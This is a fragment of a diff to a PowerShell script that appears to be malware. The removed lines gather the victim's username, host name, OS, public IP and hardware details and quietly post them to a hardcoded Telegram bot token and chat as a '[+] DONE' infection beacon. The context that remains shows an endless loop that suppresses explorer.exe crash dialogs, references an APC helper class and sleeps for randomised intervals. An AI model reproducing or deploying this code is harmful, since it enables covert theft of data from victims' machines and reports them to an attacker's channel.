@@ -1,64 +1,3 @@
-$group = "DefaultGroup"
-
-function Write-Log {
-    param(
-        [string]$Message,
-        [string]$Level = "INFO"
-    )
-    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
-    $logMessage = "[$timestamp] [$Level] $Message"
-    Write-Host $logMessage
-}
-
-function Send-TelegramNotify {
-    try {
-        $username = $env:USERNAME
-        $computerName = $env:COMPUTERNAME
-        $cpu = try { (Get-CimInstance Win32_Processor).Name.Trim() } catch { "Unknown" }
-        $gpu = try { (Get-CimInstance Win32_VideoController | Select-Object -First 1).Name.Trim() } catch { "Unknown" }
-        $ram = try {
-            $totalBytes = (Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory
-            "{0:N2} GB" -f ($totalBytes / 1GB)
-        } catch { "Unknown" }
-      
-        $ip = try {
-            (Invoke-RestMethod -Uri "https://api.ipify.org/?format=json" -TimeoutSec 5).ip
-        } catch {
-            try {
-                (Get-NetIPAddress | Where-Object { $_.AddressFamily -eq 'IPv4' -and $_.PrefixOrigin -eq 'Dhcp' } | Select-Object -First 1).IPAddress
-            } catch { "Unknown" }
-        }
-      
-        $os = [System.Environment]::OSVersion.VersionString
-      
-        $msg = @"
-[+] DONE
-User: $username
-Host: $computerName
-OS: $os
-IP: $ip
-CPU: $cpu
-GPU: $gpu
-RAM: $ram
-Group: $group
-Timestamp: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
-"@
-      
-        $bot = "7252153973:AAHhnvXQn4Q5DJTEtLiA7y59VCkJEdEFoak"
-        $chat = "-1002513798195"
-        $uri = "https://api.telegram.org/bot$bot/sendMessage"
-        $body = @{
-            chat_id = $chat
-            text = $msg
-            disable_notification = $true
-        }
-      
-        Invoke-RestMethod -Uri $uri -Method Post -Body $body -TimeoutSec 10 | Out-Null
-    } catch {}
-}
-
-Send-TelegramNotify
-
 while ($true) {
     try {
         # === SUPPRESS CRASH DIALOGS (prevents "explorer.exe has stopped" popups) ===
@@ -170,6 +109,4 @@ public class ApcHelper {
 
     $sleepTime = 240 + (Get-Random -Minimum -60 -Maximum 120)
     Start-Sleep -Seconds $sleepTime
-
 }
-
